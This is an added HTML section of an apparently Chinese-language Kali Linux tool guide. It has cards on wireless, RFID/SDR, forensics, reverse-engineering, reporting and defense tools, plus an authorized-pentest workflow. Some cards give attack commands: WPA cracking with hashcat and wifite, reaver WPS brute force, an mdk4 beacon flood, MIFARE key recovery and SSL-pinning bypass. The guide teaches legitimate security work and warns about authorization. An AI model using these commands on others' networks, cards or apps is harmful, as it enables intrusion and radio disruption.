+      <p class="desc">把抓到的 pcapng 转成 hashcat 的 22000 格式，是"抓包 → GPU 破解"之间的标准转换器。</p>
+<pre><code>hcxpcapngtool -o hash.hc22000 -E essidlist dump.pcapng
+hashcat -m 22000 hash.hc22000 rockyou.txt</code></pre>
+      <p class="note"><b>坑：</b>转换后显示 0 条哈希说明没抓到有效握手，别急着怪 hashcat。</p>
+    </article>
+
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>Wifite</h3><span class="tag">无线</span></div>
+      <p class="desc">把扫描、抓包、deauth、破解串成一条自动流水线，适合批量评估周边无线安全状况。</p>
+<pre><code>sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt</code></pre>
+      <p class="note"><b>坑：</b>全自动意味着主动干扰，测试前必须确认授权范围包含无线；WPS 破解成功率取决于路由器。</p>
+    </article>
+
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>Kismet</h3><span class="tag">无线</span></div>
+      <p class="desc">被动无线侦测：AP、客户端、探测请求、蓝牙/BLE 一网打尽，带 Web 界面和日志，适合做无线资产测绘。</p>
+<pre><code>sudo kismet -c wlan0</code></pre>
+      <p class="note"><b>坑：</b>默认会尝试接管网卡；容器里跑要手动映射接口；日志体积增长很快。</p>
+    </article>
+
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>Reaver / Bully</h3><span class="tag">无线</span></div>
+      <p class="desc">针对 WPS 的 PIN 爆破，利用 WPS 设计缺陷拿 WPA 口令，老路由器上仍有命中。</p>
+<pre><code>sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1</code></pre>
+      <p class="note"><b>坑：</b>现代固件普遍有锁定期和防爆破；<code>-K 1</code> 用 pixie dust，更快但依赖芯片实现。</p>
+    </article>
+
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>mdk4</h3><span class="tag">无线</span></div>
+      <p class="desc">802.11 压力测试工具：deauth 风暴、信标洪泛、伪造 AP，用于测试无线 IDS 和客户端健壮性。</p>
+<pre><code>sudo mdk4 wlan0mon b -f ap_list.txt</code></pre>
+      <p class="note"><b>坑：</b>这是主动干扰，在多数司法辖区等同破坏通信，只能在自己的屏蔽实验室里用。</p>
+    </article>
+
+    <article class="card" data-cat="wireless">
+      <div class="card-h"><h3>Fern WiFi Cracker</h3><span class="tag">无线</span></div>
+      <p class="desc">图形化无线测试工具，点几下就能完成 WEP/WPA/WPS 流程，适合入门理解整体步骤。</p>
+<pre><code>sudo fern-wifi-cracker</code></pre>
+      <p class="note"><b>坑：</b>依赖旧版 Qt/Python 组件，新版 Kali 上可能起不来；真做测试还是用 aircrack-ng 组合。</p>
+    </article>
+
+    <!-- ===== 硬件 / 射频 ===== -->
+    <article class="card" data-cat="hw">
+      <div class="card-h"><h3>Proxmark3</h3><span class="tag">硬件/射频</span></div>
+      <p class="desc">RFID/NFC 研究的通用硬件：读卡、嗅探、模拟、克隆低频与高频卡，配合官方客户端 <code>pm3</code> 使用。</p>
+<pre><code>pm3
+&gt; hw version
+&gt; lf search
+&gt; hf search</code></pre>
+      <p class="note"><b>坑：</b>固件与客户端版本必须匹配，否则命令全报错；不同批次硬件"变砖"风险要提前了解。</p>
+    </article>
+
+    <article class="card" data-cat="hw">
+      <div class="card-h"><h3>mfoc / mfcuk</h3><span class="tag">硬件/射频</span></div>
+      <p class="desc">MIFARE Classic 卡的密钥恢复：mfoc 用已知密钥推导全卡，mfcuk 走 darkside 攻击找未知密钥。</p>
+<pre><code>mfoc -O card.mfd
+mfcuk -C -R 0:A -s 250 -v 3</code></pre>
+      <p class="note"><b>坑：</b>需要 PN532 等兼容读卡器；新版卡片（MIFARE Plus / DESFire）不适用这套攻击。</p>
+    </article>
+
+    <article class="card" data-cat="hw">
+      <div class="card-h"><h3>libnfc 工具集</h3><span class="tag">硬件/射频</span></div>
+      <p class="desc">nfc-list / nfc-mfclassic 等命令行小工具，做卡片识别、数据转储、UID 模拟的基础。</p>
+<pre><code>nfc-list
+nfc-mfclassic r a card.mfd</code></pre>
+      <p class="note"><b>坑：</b>同一读卡器同时只能被一个进程占用，先确认没有别的服务在抢。</p>
+    </article>
+
+    <article class="card" data-cat="hw">
+      <div class="card-h"><h3>bluetoothctl / bettercap BLE</h3><span class="tag">硬件/射频</span></div>
+      <p class="desc">蓝牙设备发现与配对调试；配合 bettercap 的 BLE 模块可观察广播、做 GATT 枚举。</p>
+<pre><code>bluetoothctl
+&gt; scan on
+&gt; devices
+&gt; info AA:BB:CC:DD:EE:FF</code></pre>
+      <p class="note"><b>坑：</b>虚拟机里没有蓝牙直通就看不到任何设备；BLE 地址默认随机化，扫描靠名称识别。</p>
+    </article>
+
+    <article class="card" data-cat="hw">
+      <div class="card-h"><h3>Ubertooth</h3><span class="tag">硬件/射频</span></div>
+      <p class="desc">开源蓝牙嗅探硬件，能抓蓝牙经典与 BLE 的链路层数据，用于分析配对与广播过程。</p>
+<pre><code>ubertooth-scan
+ubertooth-btle -f -c capture.pcap</code></pre>
+      <p class="note"><b>坑：</b>加密链路抓下来仍是密文；跳频跟踪需要目标在活动状态。</p>
+    </article>
+
+    <article class="card" data-cat="hw">
+      <div class="card-h"><h3>RTL-SDR</h3><span class="tag">硬件/射频</span></div>
+      <p class="desc">几十块钱的软件无线电接收棒：听调频、看频谱、解 pager、看飞机 ADS-B，射频入门的最低门槛。</p>
+<pre><code>rtl_test -t
+rtl_fm -f 100.7M -M wbfm -s 200k -r 48k - | play -t raw -r 48k -e signed -b 16 -c 1 -</code></pre>
+      <p class="note"><b>坑：</b>只能收不能发；采样率越高越容易丢包，USB 供电不足时先接带电源的 HUB。</p>
+    </article>
+
+    <article class="card" data-cat="hw">
+      <div class="card-h"><h3>HackRF One</h3><span class="tag">硬件/射频</span></div>
+      <p class="desc">半双工收发 SDR，1MHz–6GHz，能录制回放、做简单的信号注入，价格在发射能力里最低。</p>
+<pre><code>hackrf_info
+hackrf_transfer -r capture.iq -f 433920000 -s 2000000</code></pre>
+      <p class="note"><b>坑：</b>发射需要合法频段与功率，干扰航空/应急频段后果严重；先学法规再按 PTT。</p>
+    </article>
+
+    <article class="card" data-cat="hw">
+      <div class="card-h"><h3>GNU Radio</h3><span class="tag">硬件/射频</span></div>
+      <p class="desc">图形化 DSP 流程图工具，把"信号 → 解调 → 解码"搭出来，是理解无线协议最有效的办法。</p>
+<pre><code>gnuradio-companion</code></pre>
+      <p class="note"><b>坑：</b>吃 CPU；实时流用 <code>osmocom</code> 源时缓冲区太小会溢出丢样本。</p>
+    </article>
+
+    <article class="card" data-cat="hw">
+      <div class="card-h"><h3>Universal Radio Hacker</h3><span class="tag">硬件/射频</span></div>
+      <p class="desc">UHR：抓未知无线信号、自动识别调制方式、把比特流变成可编辑的协议，再回放/伪造。</p>
+<pre><code>urh</code></pre>
+      <p class="note"><b>坑：</b>解码前要先确认采样率和频率对准，否则看到的全是噪声。</p>
+    </article>
+
+    <article class="card" data-cat="hw">
+      <div class="card-h"><h3>Spooftooph</h3><span class="tag">硬件/射频</span></div>
+      <p class="desc">蓝牙设备名与地址的快速伪装，用来测试设备识别逻辑或做演示。</p>
+<pre><code>spooftooph -i hci0 -n "iPhone" -a 00:11:22:33:44:55</code></pre>
+      <p class="note"><b>坑：</b>只能改本地适配器信息，不能伪装成远端设备；新版 BlueZ 权限收紧，常需要 root。</p>
+    </article>
+
+    <!-- ===== 取证 ===== -->
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>Autopsy</h3><span class="tag">取证</span></div>
+      <p class="desc">数字取证的工作台：磁盘镜像解析、文件恢复、时间线、关键字搜索、报告导出，底层调用 Sleuth Kit。</p>
+<pre><code>autopsy
+# 浏览器打开 http://127.0.0.1:9999/autopsy</code></pre>
+      <p class="note"><b>坑：</b>务必以只读方式挂载或直接对镜像操作；对原始磁盘写入会破坏证据链。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>Sleuth Kit（fls / icat / mmls）</h3><span class="tag">取证</span></div>
+      <p class="desc">文件系统取证的命令行基座：列分区、列已删除文件、按 inode 提取内容、生成时间线。</p>
+<pre><code>mmls disk.dd
+fls -r -p disk.dd
+icat disk.dd 128 &gt; recovered.pdf
+tsk_recover disk.dd out/</code></pre>
+      <p class="note"><b>坑：</b>删除文件能否恢复取决于文件系统和后续写入；先做镜像，别在原盘上操作。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>Volatility 3</h3><span class="tag">取证</span></div>
+      <p class="desc">内存取证框架：从内存镜像里找进程、网络连接、注入代码、注册表、口令哈希。</p>
+<pre><code>vol -f mem.raw windows.info
+vol -f mem.raw windows.pslist
+vol -f mem.raw windows.netscan</code></pre>
+      <p class="note"><b>坑：</b>符号表不对会全部失败；Win10/11 建议先 <code>windows.info</code> 确认版本，再选插件。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>Binwalk</h3><span class="tag">取证</span></div>
+      <p class="desc">扫描文件里的嵌入结构：固件里的 squashfs、压缩包、证书、可执行头，能直接提取。</p>
+<pre><code>binwalk -e firmware.bin
+binwalk -Me firmware.bin</code></pre>
+      <p class="note"><b>坑：</b><code>-e</code> 依赖 unsquashfs/sasquatch，缺工具时静默失败；签名误报很常见。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>Foremost / Scalpel</h3><span class="tag">取证</span></div>
+      <p class="desc">基于文件头尾签名的carving（雕复），从无文件系统的镜像里捞出图片、文档、压缩包。</p>
+<pre><code>foremost -t jpg,pdf,zip -i disk.dd -o out/
+scalpel -c scalpel.conf disk.dd -o out/</code></pre>
+      <p class="note"><b>坑：</b>碎片化文件会残缺；输出体积可能远超镜像，预留空间。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>bulk_extractor</h3><span class="tag">取证</span></div>
+      <p class="desc">不做文件系统解析，直接从字节流里抽邮箱、URL、信用卡号、GPS 坐标，速度快、适合大镜像。</p>
+<pre><code>bulk_extractor -o out disk.dd</code></pre>
+      <p class="note"><b>坑：</b>抽取结果是"候选"，正则误报需要复核；不要把它当完整取证流程。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>Guymager</h3><span class="tag">取证</span></div>
+      <p class="desc">图形化磁盘镜像工具，支持 E01/AFF/DD，带哈希校验和进度，适合做可辩护的取证镜像。</p>
+<pre><code>sudo guymager</code></pre>
+      <p class="note"><b>坑：</b>镜像前后都要记录哈希；目标盘容量必须大于源盘已用空间。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>dc3dd</h3><span class="tag">取证</span></div>
+      <p class="desc">dcfldd 的继任者：带哈希、校验、进度、错误重试的 dd，做取证镜像比裸 dd 可靠。</p>
+<pre><code>dc3dd if=/dev/sdb of=disk.dd hash=sha256 log=image.log</code></pre>
+      <p class="note"><b>坑：</b><code>if</code>/<code>of</code> 写反会直接毁掉目标盘；先 <code>lsblk</code> 三次确认设备名。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>extundelete / ext4magic</h3><span class="tag">取证</span></div>
+      <p class="desc">从 ext3/ext4 分区恢复被删文件，按 inode、目录或全盘恢复。</p>
+<pre><code>extundelete disk.dd --restore-all</code></pre>
+      <p class="note"><b>坑：</b>必须在只读副本上操作；原分区继续写入会覆盖被删数据块。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>ExifTool</h3><span class="tag">取证</span></div>
+      <p class="desc">读写几乎所有媒体文件的元数据：GPS、拍摄设备、软件版本、编辑历史，图片溯源的第一步。</p>
+<pre><code>exiftool photo.jpg
+exiftool -a -G1 -s image.png</code></pre>
+      <p class="note"><b>坑：</b>社交平台会剥离 EXIF；改元数据会改变哈希，取证时先算哈希再操作副本。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>Steghide / zsteg</h3><span class="tag">取证</span></div>
+      <p class="desc">隐写检测与提取：steghide 处理 jpg/bmp/wav，zsteg 专攻 PNG，CTF 和恶意样本里都常见。</p>
+<pre><code>steghide extract -sf cover.jpg
+zsteg -a image.png</code></pre>
+      <p class="note"><b>坑：</b>提取需要口令，暴力不可行；extract 前先 <code>steghide info</code> 看有没有嵌入数据。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>oletools / pdf-parser</h3><span class="tag">取证</span></div>
+      <p class="desc">分析 Office 宏和 PDF 里的恶意脚本：olevba 抽宏、pdf-parser 看对象和 JS，是样本初筛的标配。</p>
+<pre><code>olevba suspicious.docm
+pdf-parser.py --search javascript invoice.pdf</code></pre>
+      <p class="note"><b>坑：</b>只做静态分析，别用办公软件打开样本；宏代码里常有混淆，<code>olevba -c</code> 能解一层。</p>
+    </article>
+
+    <article class="card" data-cat="forensic">
+      <div class="card-h"><h3>rkhunter / chkrootkit</h3><span class="tag">取证</span></div>
+      <p class="desc">主机完整性检查：可疑 SUID 文件、隐藏进程、被替换的系统命令、常见 rootkit 特征。</p>
+<pre><code>sudo rkhunter --check --sk
+sudo chkrootkit</code></pre>
+      <p class="note"><b>坑：</b>误报非常多（尤其容器环境）；被入侵后攻击者可能已经改了这些工具本身。</p>
+    </article>
+
+    <!-- ===== 逆向 ===== -->
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>radare2 / rizin</h3><span class="tag">逆向</span></div>
+      <p class="desc">命令行逆向框架：反汇编、反编译、调试、打补丁，脚本化能力强，适合批量分析。</p>
+<pre><code>r2 -A ./binary
+[0x00000000]&gt; afl
+[0x00000000]&gt; pdf @ main</code></pre>
+      <p class="note"><b>坑：</b>命令体系陡峭，先记 <code>aaa</code>（分析）、<code>afl</code>（函数）、<code>pdf</code>（反汇编）、<code>iz</code>（字符串）。</p>
+    </article>
+
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>Ghidra</h3><span class="tag">逆向</span></div>
+      <p class="desc">NSA 开源的逆向平台，反编译质量接近商业工具，支持协作、脚本（Java/Python）和大量架构。</p>
+<pre><code>ghidra
+# 无界面批量分析
+analyzeHeadless /tmp/proj MyProj -import ./binary -postScript decompile.py</code></pre>
+      <p class="note"><b>坑：</b>首次启动要几 GB 堆内存；反编译结果变量名全是 <code>local_xx</code>，得自己改才有可读性。</p>
+    </article>
+
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>GDB + GEF / pwndbg</h3><span class="tag">逆向</span></div>
+      <p class="desc">Linux 原生调试器，配合 GEF/pwndbg 插件才有栈、堆、寄存器、漏洞利用辅助的可视化。</p>
+<pre><code>gdb -q ./vuln
+(gdb) checksec
+(gdb) pattern create 200
+(gdb) run</code></pre>
+      <p class="note"><b>坑：</b>默认 GDB 很难用；插件要单独装，Kali 不会预装。PIE/ASLR 下地址每次不同。</p>
+    </article>
+
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>objdump / readelf / nm</h3><span class="tag">逆向</span></div>
+      <p class="desc">不用打开 GUI 就能看二进制：节表、符号、动态依赖、保护机制（NX/PIE/RELRO）。</p>
+<pre><code>readelf -h ./binary
+readelf -l ./binary | grep -i gnu_stack
+objdump -d -M intel ./binary | less</code></pre>
+      <p class="note"><b>坑：</b>strip 过的二进制没有符号，函数边界要靠启发式判断。</p>
+    </article>
+
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>strace / ltrace</h3><span class="tag">逆向</span></div>
+      <p class="desc">看程序到底向内核要了什么（文件、socket、进程）和调了哪些库函数，黑盒分析的第一层。</p>
+<pre><code>strace -f -s 200 ./binary
+ltrace -f -S ./binary</code></pre>
+      <p class="note"><b>坑：</b>输出量巨大，先 <code>-e trace=openat,connect</code> 缩小范围；静态链接的程序 ltrace 看不到。</p>
+    </article>
+
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>apktool</h3><span class="tag">逆向</span></div>
+      <p class="desc">APK 解包与回编译：拿到 smali 代码、资源、AndroidManifest，改完能重新签名打包。</p>
+<pre><code>apktool d app.apk -o app_src
+apktool b app_src -o patched.apk</code></pre>
+      <p class="note"><b>坑：</b>回编译后必须重新签名才能安装；新版 APK 有资源混淆，反编译可能直接失败。</p>
+    </article>
+
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>jadx / jadx-gui</h3><span class="tag">逆向</span></div>
+      <p class="desc">把 DEX 反编译成可读 Java 代码，比读 smali 快得多；GUI 支持交叉引用和搜索。</p>
+<pre><code>jadx -d out app.apk
+jadx-gui app.apk</code></pre>
+      <p class="note"><b>坑：</b>混淆过的包类名全是 <code>a.a.a</code>；加固/加壳的 APK 只能看到壳的代码。</p>
+    </article>
+
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>Frida</h3><span class="tag">逆向</span></div>
+      <p class="desc">动态插桩：运行时 hook 函数、改返回值、绕过证书绑定和越狱检测，移动端分析的主力。</p>
+<pre><code>frida-ps -U
+frida -U -f com.example.app -l hook.js --no-pause</code></pre>
+      <p class="note"><b>坑：</b>需要目标端有 frida-server 且与客户端版本一致；反调试会检测 27042 端口。</p>
+    </article>
+
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>objection</h3><span class="tag">逆向</span></div>
+      <p class="desc">基于 Frida 的移动端"开箱即用"工具集，ssl pinning 绕过、root 检测绕过、内存搜索都有现成命令。</p>
+<pre><code>objection -g com.example.app explore
+com.example.app&gt; android sslpinning disable</code></pre>
+      <p class="note"><b>坑：</b>只覆盖常见实现，自写校验要手动写 hook；iOS 需要越狱设备或重签名 IPA。</p>
+    </article>
+
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>UPX</h3><span class="tag">逆向</span></div>
+      <p class="desc">可执行文件压缩/加壳，也用来脱壳：<code>-d</code> 能还原大部分 UPX 壳的样本。</p>
+<pre><code>upx -d packed.exe -o unpacked.exe
+upx -l packed.exe</code></pre>
+      <p class="note"><b>坑：</b>改过壳头或二次加壳的脱不掉；脱壳后要修导入表才能跑。</p>
+    </article>
+
+    <article class="card" data-cat="rev">
+      <div class="card-h"><h3>Cutter</h3><span class="tag">逆向</span></div>
+      <p class="desc">radare2 的图形界面，拖进二进制就有反汇编图、函数列表和调试器，比纯命令行友好。</p>
+<pre><code>cutter ./binary</code></pre>
+      <p class="note"><b>坑：</b>大二进制分析很慢；内嵌的 r2 版本和系统 r2 可能不一致。</p>
+    </article>
+
+    <!-- ===== 报告 ===== -->
+    <article class="card" data-cat="report">
+      <div class="card-h"><h3>CherryTree</h3><span class="tag">报告</span></div>
+      <p class="desc">树状笔记：按主机/服务/漏洞组织测试记录，支持代码块、截图、导出 PDF/HTML，离线可用。</p>
+<pre><code>cherrytree notes.ctb</code></pre>
+      <p class="note"><b>坑：</b>.ctb 是 SQLite，别放同步盘里并发写；重要项目定时导出备份。</p>
+    </article>
+
+    <article class="card" data-cat="report">
+      <div class="card-h"><h3>Faraday</h3><span class="tag">报告</span></div>
+      <p class="desc">协作式漏洞管理平台，能直接导入 nmap、Burp、Nuclei 的结果，统一去重、分级、出报告。</p>
+<pre><code>faraday-server
+# 客户端 faraday-client 连接后导入扫描结果</code></pre>
+      <p class="note"><b>坑：</b>默认口令必须改；导入前先归一化，否则同一漏洞会出现十几条重复记录。</p>
+    </article>
+
+    <article class="card" data-cat="report">
+      <div class="card-h"><h3>Dradis</h3><span class="tag">报告</span></div>
+      <p class="desc">渗透报告协作框架：把工具输出导入成 issue 列表，套模板生成 Word/PDF 报告。</p>
+<pre><code>dradis
+# 或 docker 部署，默认端口 3000</code></pre>
+      <p class="note"><b>坑：</b>免费版功能有限；模板改起来是 Ruby ERB，不熟就先别动。</p>
+    </article>
+
+    <article class="card" data-cat="report">
+      <div class="card-h"><h3>CutyCapt</h3><span class="tag">报告</span></div>
+      <p class="desc">无头浏览器截图，把漏洞页面、后台界面批量截成证据图，避免手抖漏截。</p>
+<pre><code>cutycapt --url=http://10.10.10.5/admin --out=evidence.png --max-wait=3000</code></pre>
+      <p class="note"><b>坑：</b>对 SPA 支持差，很多时候截到白屏；重要页面手工补图。</p>
+    </article>
+
+    <article class="card" data-cat="report">
+      <div class="card-h"><h3>Metagoofil</h3><span class="tag">报告</span></div>
+      <p class="desc">从公开网站批量下载文档并抽取元数据（作者、软件、路径、内网主机名），OSINT 报告常引用的证据来源。</p>
+<pre><code>metagoofil -d example.com -t pdf,docx,xlsx -l 20 -o docs/</code></pre>
+      <p class="note"><b>坑：</b>下载的是别人的文件，注意合规与保存期限；很多文档已被清洗过元数据。</p>
+    </article>
+
+    <article class="card" data-cat="report">
+      <div class="card-h"><h3>asciinema</h3><span class="tag">报告</span></div>
+      <p class="desc">录制终端会话成可回放的文本录像，复现步骤比截图可信，体积也小。</p>
+<pre><code>asciinema rec evidence.cast
+asciinema play evidence.cast</code></pre>
+      <p class="note"><b>坑：</b>录像里可能有凭据和 token，交付前必须检查并脱敏。</p>
+    </article>
+
+    <!-- ===== 防守 ===== -->
+    <article class="card" data-cat="defense">
+      <div class="card-h"><h3>Suricata</h3><span class="tag">防守</span></div>
+      <p class="desc">IDS/IPS/NSM：规则匹配 + 协议解析 + 文件提取，能实时告警也能落 PCAP，是自建检测的起点。</p>
+<pre><code>sudo suricata -i eth0 -c /etc/suricata/suricata.yaml
+sudo suricata-update</code></pre>
+      <p class="note"><b>坑：</b>规则不更新等于没有检测；误报要靠 <code>threshold</code>/<code>suppress</code> 调，不要直接关规则。</p>
+    </article>
+
+    <article class="card" data-cat="defense">
+      <div class="card-h"><h3>Zeek</h3><span class="tag">防守</span></div>
+      <p class="desc">网络流量分析框架，把流量变成连接日志、DNS/HTTP/SSL 日志，配合脚本做行为检测。</p>
+<pre><code>zeek -i eth0 local
+cat conn.log | zeek-cut id.orig_h id.resp_h duration</code></pre>
+      <p class="note"><b>坑：</b>日志量巨大，生产要配日志轮转和归档；不解析加密内容，只看元数据。</p>
+    </article>
+
+    <article class="card" data-cat="defense">
+      <div class="card-h"><h3>Arkime</h3><span class="tag">防守</span></div>
+      <p class="desc">大规模 PCAP 索引与检索（原 Moloch），能全文搜会话、还原文件、做流量取证。</p>
+<pre><code># Kali Purple 集成；单独部署见官方文档
+sudo systemctl start arkimecapture</code></pre>
+      <p class="note"><b>坑：</b>吃磁盘，抓包前先算容量；索引和抓包节点要分开部署才稳。</p>
+    </article>
+
+    <article class="card" data-cat="defense">
+      <div class="card-h"><h3>Wazuh</h3><span class="tag">防守</span></div>
+      <p class="desc">开源 HIDS/SIEM：文件完整性、日志分析、漏洞检测、合规基线，一套装完能看到主机层告警。</p>
+<pre><code># 服务端 + agent，安装见 documentation.wazuh.com
+sudo systemctl status wazuh-manager</code></pre>
+      <p class="note"><b>坑：</b>默认规则噪声大，先跑一周再调；agent 版本必须和服务端一致。</p>
+    </article>
+
+    <article class="card" data-cat="defense">
+      <div class="card-h"><h3>TheHive + Cortex</h3><span class="tag">防守</span></div>
+      <p class="desc">事件响应工单系统 + 分析器引擎：把告警变成 case，自动跑 VirusTotal、MISP 等分析器。</p>
+<pre><code># docker 部署，端口 9000（TheHive）/ 9001（Cortex）</code></pre>
+      <p class="note"><b>坑：</b>组件多（ES/Cassandra/MinIO），资源不够会一直起不来；先看官方 compose 示例。</p>
+    </article>
+
+    <article class="card" data-cat="defense">
+      <div class="card-h"><h3>MISP</h3><span class="tag">防守</span></div>
+      <p class="desc">威胁情报共享平台：IOC 的结构化管理、关联、导出为 IDS 规则，团队情报协作的事实标准。</p>
+<pre><code># Kali Purple 预置，或 docker 部署</code></pre>
+      <p class="note"><b>坑：</b>情报质量决定价值，别把未验证的 IOC 直接喂给检测设备。</p>
+    </article>
+
+    <article class="card" data-cat="defense">
+      <div class="card-h"><h3>Velociraptor</h3><span class="tag">防守</span></div>
+      <p class="desc">端点可见性与取证：用 VQL 查询全网点进程、文件、注册表，做大规模应急排查。</p>
+<pre><code>velociraptor --config server.config.yaml frontend</code></pre>
+      <p class="note"><b>坑：</b>端点代理权限很高，部署前要有明确授权和审计；查询范围大时会拖慢终端。</p>
+    </article>
+
+    <article class="card" data-cat="defense">
+      <div class="card-h"><h3>CALDERA</h3><span class="tag">防守</span></div>
+      <p class="desc">MITRE 的自动化对抗模拟：用 ATT&CK 战术编排"攻击"，验证检测规则到底有没有用。</p>
+<pre><code>python3 server.py --insecure
+# 界面 https://127.0.0.1:8888</code></pre>
+      <p class="note"><b>坑：</b>它真的会执行攻击动作，只能在隔离的实验网段跑；agent 部署范围要严格控制。</p>
+    </article>
+
+  </div>
+
+  <p class="empty" id="empty" hidden>没有匹配的工具。试试更短的关键词（如"扫描""哈希"），或点「全部」重置。</p>
+
+  <p class="muted" style="font-size:13px;margin-top:18px">
+    清单是"常用"而不是"全部"：Kali 仓库里还有 VoIP（sipvicious）、数据库（oscanner、mdbtools）、
+    社交工程（SET）、802.11 专项等上百个包，用 <code>apt-cache search kali-tools-</code> 能看到完整分类。
+  </p>
+</section>
+
+<!-- ============ 04 ============ -->
+<section id="flow">
+  <h2><span class="num">04 / WORKFLOW</span>工具是按阶段用的，不是按热度用的</h2>
+  <p class="sub">
+    新手最常见的问题不是"不会用工具"，而是<em>顺序错了</em>：还没摸清资产就上扫描器，还没确认版本就找 PoC，
+    拿到 shell 就忘了记录。下面这条线是授权测试的标准骨架，每一步都有明确的产出物和停止条件。
+  </p>
+
+  <div class="flow">
+    <div class="step">
+      <div class="no">01</div>
+      <div>
+        <h4>定范围，拿到授权</h4>
+        <p>把目标写成清单：域名、IP 段、App、接口、账号类型；写明时间窗、禁止动作、应急联系人。授权书没盖章之前，一行命令都不要跑。</p>
+        <p class="tools">产出：授权书 / 测试范围表 / 联系人 / 回滚方案</p>
+        <p class="out">停止条件：范围里有你不确定归属的资产 → 先问，不要"顺手扫一下"。</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="no">02</div>
+      <div>
+        <h4>被动侦察：先不碰目标</h4>
+        <p>WHOIS、证书透明度、搜索引擎、公开代码仓库、招聘信息、历史泄露库。目标是画资产图，而不是发包。</p>
+        <p class="tools">whois · dig · theHarvester · amass -passive · crt.sh · GitHub 搜索</p>
+        <p class="out">产出：子域/域名/IP 清单、技术栈猜测、员工与邮箱面（用于后续钓鱼演练授权范围）。</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="no">03</div>
+      <div>
+        <h4>主动扫描与枚举</h4>
+        <p>先确认存活，再扫端口，再识别服务版本，最后按服务做专项枚举（SMB、LDAP、SNMP、Web 目录）。这一步决定后面 80% 的方向。</p>
+        <p class="tools">masscan · nmap · netdiscover · enum4linux-ng · smbmap · gobuster/ffuf · whatweb</p>
+        <p class="out">产出：每台主机的"端口 → 服务 → 版本 → 可用入口"表，原始输出全部落盘。</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="no">04</div>
+      <div>
+        <h4>漏洞验证：能复现才算数</h4>
+        <p>把版本号、配置、业务逻辑对到具体问题上，用最小代价证明"能造成什么影响"。扫描器报告只是线索，不是结论。</p>
+        <p class="tools">searchsploit · nuclei · nikto · Burp Repeater · sqlmap（低风险参数）· nmap --script vuln</p>
+        <p class="out">产出：可复现的最小 PoC + 请求/响应原文 + 影响说明（能读到什么、能改什么）。</p>
+        <p class="note" style="color:var(--danger)">停止条件：验证动作可能影响业务（写库、删文件、重启服务）→ 先申请窗口。</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="no">05</div>
+      <div>
+        <h4>利用、提权、横向</h4>
+        <p>拿到初始访问后先稳（看清权限、网络位置、有没有 EDR），再提权、再找凭据、再横向。每一步都问：这一步在报告里怎么解释？</p>
+        <p class="tools">Metasploit · impacket · nxc · evil-winrm · linpeas/winPEAS · chisel/proxychains · BloodHound</p>
+        <p class="out">产出：攻击路径图、每跳的凭据/漏洞依据、影响边界（到哪一层为止，没再往下）。</p>
+      </div>
+    </div>
+    <div class="step">
+      <div class="no">06</div>
+      <div>
+        <h4>收尾：清理、复测、写报告</h4>
+        <p>删除上传的 shell/账号/计划任务，恢复配置，记录所有变更；把发现按"可复现步骤 + 证据 + 修复建议 + 优先级"写成报告。</p>
+        <p class="tools">CherryTree/Faraday · asciinema · CutyCapt · 客户工单系统</p>
+        <p class="out">产出：报告 + 证据包 + 清理清单（客户签字确认）+ 复测计划。</p>
+      </div>
+    </div>
+  </div>
+
+  <h3>工作目录这样建，后面写报告能省一半时间</h3>
+<pre><code>mkdir -p acme-2025/{00-scope,01-recon,02-scan,03-web,04-exploit,05-loot,06-report,99-tmp}
+# 原始输出一律带时间戳和命令
+nmap -sV -oA 02-scan/10.10.10.5_tcp 10.10.10.5
+script -q 03-web/burp-session.log      # 终端会话留痕
+
+# 证据文件先算哈希，交付时附在报告附录
+sha256sum 05-loot/* &gt; 05-loot/SHA256SUMS</code></pre>
+
+  <div class="panel warn">
+    <h3 style="margin-top:0">一条容易被忽略的纪律：区分"事实"和"推测"</h3>
+    <p style="margin-bottom:0">
+      报告里"服务器返回了 <code>Server: Apache/2.4.49</code>"是事实；"因此存在路径穿越"是推测，需要一条实际请求来证明。
+      把这两类句子分开写，是渗透报告可信度的分水岭，也是甲方安全团队最在意的地方。
+    </p>
+  </div>
+</section>
+
+<!-- ============ 05 ============ -->
+<section id="cheat">
+  <h2><span class="num">05 / CHEATSHEET</span>命令速查：能直接改目标就跑</h2>
+  <p class="sub">
+    按场景分组。所有 IP、域名、文件名都是占位符；每个代码块右上角可以一键复制。
+    参数细节以 <code>man</code> 和工具当前版本为准，Kali 是滚动更新，个别参数会变。
+  </p>
+
+  <div class="cheat">
+    <h3>系统与维护</h3>
+<pre><code><span class="c"># 更新（滚动发行，建议每周一次）</span>
+sudo apt update &amp;&amp; sudo apt full-upgrade -y
+
